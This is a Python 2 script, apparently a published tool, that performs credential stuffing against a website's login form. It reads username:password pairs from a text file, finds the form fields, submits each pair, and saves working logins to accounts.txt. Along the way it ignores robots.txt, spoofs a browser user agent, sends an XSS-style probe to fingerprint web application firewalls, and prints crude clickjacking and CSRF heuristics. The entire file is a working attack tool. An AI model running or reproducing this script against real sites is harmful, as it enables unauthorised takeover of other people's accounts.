#!/usr/bin/env python2
# -*- coding: utf-8 -*- 
import mechanize
import itertools
import cookielib
import os
import sys
from bs4 import BeautifulSoup
from re import search, findall
from urllib import urlopen
from urllib2 import URLError

def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])

Banner = """\033[91m-the accounts type is (username:password) inside .txt file.\033[37m
██╗0.0.1 ██████╗  ██████╗ ██╗███╗   ██╗
██║     ██╔═══██╗██╔════╝ ██║████╗  ██║
██║     ██║   ██║██║  ███╗██║██╔██╗ ██║
██║     ██║   ██║██║   ██║██║██║╚██╗██║
███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║
╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝
\033[91m         https://github.com/byRo0t96\033[37m\n"""

br = mechanize.Browser()
cookies = cookielib.LWPCookieJar()
br.set_cookiejar(cookies)
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_debug_http(False)
br.set_debug_responses(False)
br.set_debug_redirects(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('Accept-Encoding','br')]

cls()

print (Banner)

try:
    url = sys.argv[1]
    txtfile = sys.argv[2]
    if 'http://' in url:
        pass
    elif 'https://' in url:
        url = url.replace('https://', 'http://')
    else:
        url = 'http://' + url
    try:
        br.open(url, timeout=10.0)
    except URLError as e:
        url = 'https://' + url
        br.open(url)
    forms = br.forms()

    headers = str(urlopen(url).headers.headers).lower()
    if 'x-frame-options:' not in headers:
        print '\033[1;32m[+]\033[0m Heuristic found a Clickjacking Vulnerability'
    if 'cloudflare-nginx' in headers:
        print '\033[1;31m[-]\033[0m Target is protected by Cloudflare'
    data = br.open(url).read()
    if 'type="hidden"' not in data:
        print '\033[1;32m[+]\033[0m Heuristic found a CSRF Vulnerability'

    soup =  BeautifulSoup(data, 'lxml')
    i_title = soup.find('title')
    if i_title != None:
        original = i_title.contents
except:
    print('Usage: python start.py website.com txtfile.txt\n')
    sys.exit()

def WAF_detector():
    noise = "?=<script>alert()</script>"
    fuzz = url + noise
    res1 = urlopen(fuzz)
    if res1.code == 406 or res1.code == 501:
        print"\033[1;31m[-]\033[1;m WAF Detected : Mod_Security"
    elif res1.code == 999:
        print"\033[1;31m[-]\033[1;m WAF Detected : WebKnight"
    elif res1.code == 419:
        print"\033[1;31m[-]\033[1;m WAF Detected : F5 BIG IP"
    elif res1.code == 403:
        print "\033[1;31m[-]\033[1;m Unknown WAF Detected"
WAF_detector()

def usernames_list(lst):
    try:
        with open(txtfile,'r') as f:
            for line in f.readlines():
                values = line.split(":")
                final = str(values[0].replace("\r\n",""))
                lst.append(final)
    except IOError:
        print "\033[1;31m[-]\033[1;m Wordlist not found!"
        quit()

def passwords_list(lst):
    try:
        with open(txtfile,'r') as f:
            for line in f.readlines():
                values = line.split(":")
                final = str(values[1].replace("\r\n",""))
                lst.append(final)
    except IOError:
        print"\033[1;31m[-]\033[1;m Wordlist not found!"
        quit()

usernames = []
usernames_list(usernames)
print '\033[1;97m[>]\033[1;m Usernames loaded: %i'% len(usernames)
passwords = []
passwords_list(passwords)
print '\033[1;97m[>]\033[1;m Passwords loaded: %i'% + len(passwords)
def find():
    form_number = 0
    for f in forms:
        data = str(f)
        username = search(r'<TextControl\([^<]*=\)>', data)

        if username:
            username = (username.group().split('<TextControl(')[1][:-3])
            print '\033[1;33m[!]\033[0m Username found: ' + username
            passwd = search(r'<PasswordControl\([^<]*=\)>', data)

            if passwd:
                passwd = (passwd.group().split('<PasswordControl(')[1][:-3])
                print '\033[1;33m[!]\033[0m Password found: ' + passwd
                select_n = search(r'SelectControl\([^<]*=', data)
 
                if select_n:
                    name = (select_n.group().split('(')[1][:-1])
                    select_o = search(r'SelectControl\([^<]*=[^<]*\)>', data)

                    if select_o:
                        menu = "True"
                        options = (select_o.group().split('=')[1][:-1])
                        print '\n\033[1;33m[!]\033[0m A drop down menu detected.'
                        print '\033[1;33m[!]\033[0m Menu name: ' + name
                        print '\033[1;33m[!]\033[0m Options available: ' + options
                        option = raw_input('\033[1;34m[?]\033[0m Please Select an option:>> ') 
                        brute(username, passwd, menu, option, name, form_number)
                    else:
                        menu = "False"
                        try:
                            brute(username, passwd, menu, option, name, form_number)
                        except Exception as e:
                            cannotUseBruteForce(username, e)
                            pass							
                else:
                    menu = "False"
                    option = ""
                    name = ""
                    try:
                        brute(username, passwd, menu, option, name, form_number)
                    except Exception as e:
                       cannotUseBruteForce(username, e)
                       pass
            else:
                form_number = form_number + 1
                pass
        else:
            form_number = form_number + 1
            pass
    print '\033[1;31m[-]\033[0m No forms found'
def cannotUseBruteForce(username, e):
    print '\r\033[1;31m[!]\033[0m Cannot use brute force with user %s.' % username
    print '\r    [Error: %s]' % e.message	


def brute(username, passwd, menu, option, name, form_number):
    progress = 1
    iss = 0
    with open(txtfile) as f:
        for line in f.readlines():
            values = line.split(":")
            uname1 = str(values[0].replace("\n",""))
            uname = str(uname1.replace("\r",""))
            password1 = str(values[1].replace("\n",""))
            password = str(password1.replace("\r",""))
            sys.stdout.write('\r\033[1;97m[>]\033[1;m accounts tried: %i / %i'% (progress, len(usernames)))
            print '\n\033[1;97m[>]\033[1;m Bruteforcing : %s:%s'% (uname,password)
            sys.stdout.flush()
            br.open(url)  
            br.select_form(nr=form_number)
            br.form[username] = uname
            br.form[passwd] = password
            if menu == "False":
                pass
            elif menu == "True":
                br.form[name] = [option]
            else:
                pass
            resp = br.submit()
            data = resp.read()
            data_low = data.lower()
            if 'username or password' in data_low:
                pass
            else:
                soup =  BeautifulSoup(data, 'lxml')
                i_title = soup.find('title')
                if i_title == None:
                    data = data.lower()
                    if 'logout' in data:
                        print '\n\033[1;32m[+]\033[0m Valid credentials found: '
                        print uname
                        print password
                    else:
                        pass
                else:
                    injected = i_title.contents
                    if original != injected:
                        print '\033[1;32m[+]\033[0m Valid credentials found '
                        iss = iss + 1
                        fs=open("accounts.txt", "a+")
                        fs.write("{}:{}:{}\n".format(uname,password,url))
                    else:
                        pass
            progress = progress + 1
        print ''
    sys.stdout.write('\r\033[1;97m[>]\033[1;m We found: %i\n'% (iss))
    quit()
find()

